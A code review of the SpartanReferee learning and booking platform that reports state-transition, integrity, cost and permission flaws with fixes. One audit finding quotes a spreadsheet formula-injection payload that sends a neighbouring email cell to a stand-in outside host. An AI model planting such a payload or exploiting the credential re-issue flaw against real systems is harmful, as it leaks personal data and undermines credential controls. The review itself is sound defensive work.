# Code review: SpartanReferee, 7d4f68c..HEAD (learning platform steps 1-6, assignments, head-referee bookings)

Scope read end to end: api/src/learn/* (all modules and migrations), api/src/assignments.js, the servers.js/core.js/functions.js/dev-server.js diffs,
and the learn/*.js, home.js, event.js, console.js, customers.js front end. Local tests run: `cd api && node --test test/*.test.js` (88 pass) and
`node --test tests/*.mjs` (245 pass). SQL tests not run (they need secrets).

Overall: SQL is consistently parameterised (every dynamic column list comes from a fixed whitelist; IN lists are built from @p0..@pn), and the
front end escapes every untrusted value I traced through esc(). The real problems are in state transitions and data integrity, not injection.

## High

### H1. Withdraw + re-enrol lets a learner re-issue their own credential: renews an expired one and gets round suspension or revocation
- Files: api/src/learn/programmes.js:274-283 (withdraw), :256-273 (enrol reuses the withdrawn row), api/src/learn/lessons.js:148-167
  (complete runs checkCompletion even when the lesson was already done), :88-101 (checkCompletion), api/src/learn/assess.js:42, :44-54 (onComplete)
- What happens, step by step (verified):
  1. A learner completed version V. Their credential is now expired, or the owner has suspended or revoked it.
  2. `DELETE /api/learn/enrolments/<own id>`: `can('enrol')` is true for yourself, and withdraw sets `state = 'withdrawn'` even on a
     *completed* enrolment.
  3. `POST /api/learn/enrolments {programmeId}`: `had` is the withdrawn row, so the same enrolment_id becomes `active` again.
  4. `POST /api/learn/lessons/<any lesson>/complete {contentId}`: the completion already exists, so nothing is inserted, but
     `checkCompletion` still runs. The old completions (keyed by person and version) and the old passing attempt (keyed by
     enrolment_id, which was reused) both still count, so the enrolment completes again.
  5. `onComplete` supersedes only `status = 'active'` credentials, then inserts a new active one with `expires_at = now + validity_months`.
- Result: an expired credential gets a fresh expiry with no reassessment. With a suspended or revoked credential, that one stays as it is
  *and* a new active credential is issued next to it. This defeats `credentialStatus` (assess.js:287-299) and the renewal policy.
- Fix: refuse to withdraw a completed enrolment (or make that an owner/admin action). On re-enrolment create a new enrolment, and scope
  completions and attempts to it (or to `completed_at > enrolled_at`). In `onComplete`, refuse to issue when the person already has a
  suspended or revoked credential for the programme. Issue at most one credential per enrolment (a unique index on
  `credential(enrolment_id)`, or a guard).

### H2. Starting a new programme version fails (500) when any lesson has published and in-review content in the same language
- Files: api/src/learn/lessons.js:65-75 (copyVersionExtras inserts every copied content row with `version_no = 1`), migrations/003-learning.sql
  (`CONSTRAINT content_once UNIQUE (lesson_id, locale, version_no)`), api/src/learn/programmes.js:123-147
- Scenario (verified): lesson X has English v2 `published` and English v3 `review` (an editor sent a fix for review). The same happens with a
  published Spanish translation plus a newer Spanish preview in `review`. The owner runs `POST /programmes/<id>/versions`. Both rows are
  copied as (X', 'en', 1), the unique constraint fails, the whole transaction rolls back and the response is 500. No new version can be
  started until the review is resolved. The existing test (test/sql/learn-programmes.test.js:89) copies a version that has no content,
  so it doesn't catch this.
- Fix: keep `c.version_no` when copying (it is unique per lesson and locale already). Also map `translation_of` to the copied English
  even when the source English isn't copied (today a translation whose English was superseded loses its link: ids.get → null, so a
  copied `review` translation stops being a preview).

## Medium

### M1. Narration: any member can generate paid Azure TTS audio in any voice, with no limit (cost amplification)
- Files: api/src/learn/lessons.js:238-246, api/src/learn/media.js:45-66
- `voice` comes from `?voice=` and is checked only against `/^[a-z]{2}-[A-Z]{2}-\w{2,40}$/`, not against `VOICES[locale]`. Each
  (content, voice, slide) is generated once and kept, but there are about 40 slides × several hundred Azure neural voices × every
  published content version × up to 3,000 characters each. A learner with a script can make thousands of TTS calls (about $16 per million
  characters) and fill blob storage. There is no rate limit, and narration also works for content in a programme version that isn't
  published (the check is the content's state only).
- Fix: accept only `voice ∈ VOICES[content.locale]` (or ignore the parameter and use plan.voice). Add a per-person or global daily
  character budget. Also require the lesson's programme version to be published or superseded for non-editors.

### M2. Narration goes stale: editing a draft (or publishing it later) keeps playing the old audio
- Files: api/src/learn/media.js:50-51 (the lookup is by content_id, voice and slide only; the blob name has a text hash but the lookup
  ignores it), api/src/learn/lessons.js:203-216 (editContent doesn't clear media_asset)
- Scenario: an editor plays slide 3 of a draft (the audio is made), then corrects that slide's narration and saves. `had` is found, so the
  old audio comes back. When the draft is published, learners hear audio that doesn't match the captions or transcript, for good.
- Fix: include the narration hash in the lookup (or in `media_once`). Alternatively, delete the content's media_asset rows in editContent.

### M3. Completing a lesson in a preview translation stops it ever counting in that language
- Files: api/src/learn/lessons.js:154-163 (`had` is matched on person, lesson and locale, with no preview filter),
  migrations/003-learning.sql (`completion_once UNIQUE (person_id, lesson_id, locale)`), lessons.js:44-46 (counting excludes preview = 1)
- Scenario: a Spanish learner completes lesson X in the `es` preview, so a preview = 1 row is stored. The `es` translation is then approved.
  They complete X again in Spanish: `had` exists, nothing is inserted, and `doneLessons(... counting)` still excludes X. The lesson never
  counts in Spanish, so the lessons+assessment gate in mayAttempt (assess.js:148-153) blocks them. The only way out is to redo it in another
  language, and the UI gives no hint of that.
- Fix: when the stored completion is a preview and the new content is approved, update it in place (preview = 0, the new content_id,
  version and hash), or include `preview` in the unique key.

### M4. A learner enrolled on a superseded version is stuck
- Files: api/src/learn/programmes.js:106-112 (non-editors only get published versions), :256-262; learn/programmes.js:103-105
- Scenario: Anna is enrolled on 2027. 2028 is published, so 2027 becomes superseded. GET /programmes/ocr-referee filters 2027 out, so
  `v` is 2028: the curriculum, assessments and "Continue" link are all 2028's, and progress shows 0. Completing a 2028 lesson returns 403
  ("Enrol in the programme"), because her enrolment is on 2027. The page shows "Enrolled … on another version" but no Enrol button
  (because `e` exists), and learners can't withdraw themselves from the UI. Her own 2027 lessons are reachable only by a direct
  #/lesson link. The server would let her open them (getLesson allows superseded), but nothing in the UI leads there.
- Fix: for non-editors, also include the version the person is enrolled on in `versions`. Alternatively, offer "Move to 2028" (a new
  enrolment), and decide how the old one ends.

### M5. Learning-platform admin rights are permanent, and person "suspended" does nothing
- Files: api/src/learn/index.js:65-76 (global_admin is granted once at first sign-in), :56-86 (who() never looks at status);
  permissions.js:13-16
- Scenarios (verified):
  - An address in ADMIN_EMAILS, or added in the admin area, opens /learn and gets a `global_admin` role_grant row. Later they are removed
    as an admin but stay on the referee list, so memberOf still lets them in. The grant is never revisited, so they remain a full global
    admin in learning: they can read and export every person's email address, grant roles, view as anyone, and change credentials.
  - In prototype mode (no adminKey and no ADMIN_EMAILS), `isAdminEmail` is true for everyone, so every early visitor becomes a permanent
    global_admin.
  - The reverse: an admin whose first visit came before they became an admin never gets the grant.
  - `person.status = 'suspended'` (editable by admins and coordinators) is checked nowhere: a suspended person keeps every permission,
    and admins can still view as a suspended demo person.
- Fix: at each request in who(), sync the `global_admin` grant from memberOf(me).admin (add or remove it, and audit the change), or keep
  site admin separate from learning roles. Refuse a suspended (or merged) person in who(), with a 403.

### M6. CSV export: formula injection, and an unscoped query of every credential
- Files: api/src/learn/reports.js:84 (cell() quotes but doesn't neutralise `= + - @`), :83 (loads every non-superseded credential in the
  database), :87 (an O(rows × credentials) filter)
- Scenario: a referee's Microsoft display name becomes legal_name at first sign-in (index.js:70 via text(), which strips `<>` and control
  characters but not `=`). A name like `=HYPERLINK("https://x/?"&C2,"open")` runs as a formula when an admin or coordinator opens the export
  in Excel, and can leak the email in the next cell. Coordinators can also set legal names for people in their region.
- Fix: in cell(), prefix `'` (or a tab) when a value starts with `= + - @ \t \r`. Fetch credentials with the same scope or WHERE as the rows,
  or with `person_id IN` the exported people, and index them by `person|programme` instead of filtering for each row.

### M7. A version with several assessments completes when any one of them is passed
- Files: api/src/learn/assess.js:42 (assessmentPassed: any attempt on the enrolment with result 'pass'), :95-104 (addAssessment has no limit)
- Scenario: the owner adds "Theory" and "Video judgement" to 2027 with rule `assessment`. A learner passes Theory only, checkCompletion
  succeeds and the credential is issued. Video judgement is never needed.
- Fix: require a pass for every assessment of the version (count the version's distinct assessment_ids that have a pass, and compare with
  the total), or allow only one assessment per version.

### M8. State changes aren't guarded in the database: double submits and double decisions can re-score, and completion can run twice (Plausible)
- Files: api/src/learn/assess.js:226-241 (`result !== 'open'` is checked before the transaction; the UPDATE has no `AND result = 'open'`),
  :256-275 (decide likewise, with `pending`), lessons.js:97 (`UPDATE enrolment SET state='completed'` has no `AND state = 'active'`),
  assess.js:44-54
- Scenarios:
  - Two submits of one attempt (a double tap, or a script sending two answer sets) both pass the early check. The second waits on the
    first's row lock, then overwrites the answers and score. The stored attempt can show `fail` while the first submit already completed
    the enrolment and issued a credential.
  - Two assessors decide one pending attempt at the same time: the same overwrite.
  - Two different attempts passing at once (with M7, two assessments) update different attempt rows. Under Azure SQL's default
    READ_COMMITTED_SNAPSHOT both read the enrolment as `active`, so both complete it and both issue credentials (one is immediately
    superseded, and the audit log shows two issues).
- Fix: guard each transition in its UPDATE (`... WHERE attempt_id=@id AND result='open'`, `... AND state='active'`). Return the affected
  rows (OUTPUT inserted.*) and stop when there are none. Also add a unique index on credential(enrolment_id).

### M9. Viewing a rule rebuilds every rule link, and concurrent views can return 500
- Files: api/src/learn/govern.js:21-39 (syncLinks), :90-92 (getRule calls it on every GET, with no permission check), :128
- Each GET /rules/<id>, from any member, reads and JSON-parses every content_version body in draft, review or published state (all
  languages and all versions), every question, and every link. It then inserts or deletes rows one at a time, outside a transaction.
  Two people opening rule pages together both see a link missing and both INSERT it, so the PK (rule_id, target_type, target_id) is
  violated and one gets a 500. A question whose rules list repeats an id (`"OCR-2026-4.2,OCR-2026-4.2"`; readQuestion doesn't dedupe)
  causes a PK violation inside a single run. The cost grows with content × languages × versions.
- Fix: maintain rule_link when content or questions are saved (newContent, editContent, addQuestion, copyVersionExtras), and delete them
  when content or questions are deleted, inside those transactions. Drop syncLinks from the GET path, or run it only for admins.
  Dedupe the rule ids in readQuestion.

## Low

- **L1. Governance reads aren't scoped** (govern.js:76-100, :160-164, :180-211): any member, including a plain learner, can list every
  programme's review items. Their `affected` lists include question prompts from draft and published assessments, and links into draft
  versions. listReviews' `can.decide` looks only at the first row's programme. The handbook writes an audit row on every GET
  (govern.js:204), so any member can grow the audit log without limit. Fix: limit drafts and question prompts to editors, and audit only
  PDF downloads (or throttle that audit).
- **L2. A coordinator can move a person out of their regions** (index.js:158): `v.region_id && !can(...)` lets `regionId: ''` (null)
  through, so the person drops out of every coordinator's view. Fix: check `'region_id' in v`, and require admin to set it to null.
- **L3. Race on first sign-in** (index.js:65-76): two requests at once from a new person both create a person row, and the second fails
  on the person_login PK (500, and a person_seq number is used up). Fix: catch the duplicate key and read the row again.
- **L4. The database isn't woken again after it pauses (Plausible)** (db.js:35): wake() and its friendly 503 only cover the first
  connection a process makes. Once Azure SQL serverless auto-pauses while the process stays warm, the pool's new connections fail with
  40613. That isn't tagged `waking`, so core.js returns a generic 500. Fix: in query and tx, catch errors where `asleep(e)` is true and
  rethrow them with `waking` (or retry once).
- **L5. Progress bookmarks have no access checks** (lessons.js:138-146): any member can write lesson_progress for any lesson (including
  ones in draft versions) and any content_id of that lesson, including drafts. The harm is small, but it should require the version to be
  visible.
- **L6. A superseded credential can be made active again** (assess.js:290-293): the person then has two active credentials for the
  programme. Fix: allow only `active ↔ suspended`, and `→ revoked`.
- **L7. The slide editor drops `note`** (learn/lesson.js:229-230): saving a draft sends heading, points, narration, rules, review and figure,
  but not note. readSlides then stores note '', so a slide's note is silently lost on the first save. No seeded content uses it today.
- **L8. Dates for effective_date show a day early west of UTC** (learn/programmes.js:132, learn/govern.js:31, :89): DATE columns arrive
  as UTC midnight and are formatted with local toLocaleDateString, so in the Americas "effective 1 Jan 2027" shows as 31 Dec 2026. Format
  them with `timeZone: 'UTC'`, as home.js does.
- **L9. Inconsistent meaning of an unscoped programme_owner grant** (permissions.js:13-15 treat a null programme_id as every programme;
  reports.js:21 ignores grants without a programme_id): an "all programmes" owner can edit and approve everything but gets 403 on
  reports. grantRole (index.js:171-183) also accepts any role with or without scope, and doesn't check that programmeId or regionId exist.
- **L10. The handbook could hit SQL Server's 2,100-parameter limit (Plausible)** (govern.js:200-201, :62): it passes every rule id cited
  in the programme to rulesFor as separate parameters. A large programme would get a 500. Fix: use a table-valued parameter, or chunk the
  list.
- **L11. With retake_wait_hours 0, max_attempts does nothing** (assess.js:154-158): the wait expires at once, so attempts are unlimited.
  If that's intended, the policy text "N attempts" on the programme page is misleading.
- **L12. Practice cameras compete with events for the shared GPU slot** (servers.js:209-211, :248; core.js practice-camera route): any
  referee can book a practice camera (up to 40 cameras requested) that starts now. Advance event bookings are protected by othersRunning,
  but a head referee trying to start an event's cameras *now* gets "All our servers are in use", and the referee can book again straight
  after. Consider capping practice to 1 or 2 cameras, and refusing practice while an event window is open.
- **L13. The dev server listens on every network interface** (api/dev-server.js:67, `.listen(port)`): with LEARN_FROM_AZ=1 it holds
  the live SQL login, the Speech key and the storage connection string, and anyone on the same network can use its dev sign-in
  ("dev:anyone@…") as any address. Bind to 127.0.0.1.
- **L14. A narration error can leak SQL details** (lessons.js:244-245): if two people request the same slide at once, the second
  INSERT hits `media_once`, and that error goes to the browser verbatim (`reply(e.status || 502, { error: e.message })`). Log it and
  return a generic message. With M2 fixed, a duplicate should also be treated as success.
- **L15. Multiple active enrolments** (programmes.js:261-266): enrolling on the new version leaves the old enrolment active, so reports
  count the person twice under "enrolled" and "in progress".

## Performance (beyond M6 and M9)
- record() (programmes.js:295-300) and v1 enrolments (reports.js:113) run about 6 queries per enrolment (a lesson count, plus
  progressOf in lessons and assess). Batch these by version or enrolment.
- lessonExtras (govern.js:68-73) loads and JSON-parses every open review item of the programme on each lesson view. Store affected lesson
  ids in a join table.
- unitsList (servers.js:317), assignments.home and eventPage (assignments.js:40, :52) list the whole `assignment` table on every request.
  This is fine at today's size; key or partition by email and event if it grows.
- Each /api/learn request makes about 3 SQL round trips (login join, grants, and grants again in /me) plus 2 Table Storage reads for
  membership. That's acceptable, but /me could reuse w.real's grants.

## Maintainability and tests
- The cross-module hooks (`ctx.programmeExtras`, `progressOf`, `copyVersionExtras`, `beforeDeleteLessons`, `checkCompletion`,
  `onComplete`, `rulesFor`...) are monkey-patched wrappers whose order depends on the order of `areas` in index.js:227. assess's
  `progressOf` silently relies on lessons having set it first. A small explicit registry (`ctx.on('copyVersion', fn)`) would make the
  order and the contracts visible.
- `"SELECT TOP 1 * FROM enrolment WHERE person_id=@p AND version_id=@v AND state <> 'withdrawn'"` is repeated 4 times (lessons.js:116,
  :152, assess.js:165, :179). Make it a helper.
- Test gaps that would have caught the findings above: withdraw → re-enrol → complete (H1); a new version copied from one with content in
  review (H2); completing a preview translation, then again after approval (M3); a superseded-version learner (M4); two assessments in one
  version (M7); export cells that start with `=` (M6). The SQL tests can't run in CI without secrets, so the pure parts (scoring, mayAttempt
  policy, credView dates, the CSV cell, readSlides) would be worth unit-testing directly.

## Checked and fine
- SQL injection: none found. UPDATE SET column lists come from fixed key sets (index.js:161, programmes.js:90, :171). IN lists are
  parameterised (index.js:94, assess.js:252, govern.js:62, reports.js:29-30). `{S}` is validated by `/^[a-z_]{1,32}$/`. The
  `${isUuid(b) ? …}` and `${v.validity_months ? 'DATEADD…' : 'NULL'}` fragments are constants.
- XSS: every server value interpolated into innerHTML in learn/*.js, home.js, event.js and customers.js goes through esc() (which escapes
  quotes too). Hrefs are built from server UUIDs, programme ids or encodeURIComponent. The sign-in return path is whitelisted (safeBack).
- View-as: needs `view-as` on the *real* grants, works only on synthetic people, and is audited with actor and acting_as. Practice-camera
  booking ignores it.
- Head-referee check (servers.js:106-111, :451): checked on the server for checkout, pay, start, extend and stop of event units; open and
  history stay available to every member. Emails are lowercased on both sides, and the event id is derived the same way. Training units can
  only ever be your own (unitOf).
- SAS links: per blob (`sr=b`). A 5-minute create/write link stays on the server; a 2-hour read link goes to the browser. The storage key
  never leaves the server.
- IDOR on attempts, credentials, records and people: each GET or change re-checks with can() against the target's programme or region, and
  returns 404 rather than 403 to avoid revealing existence.
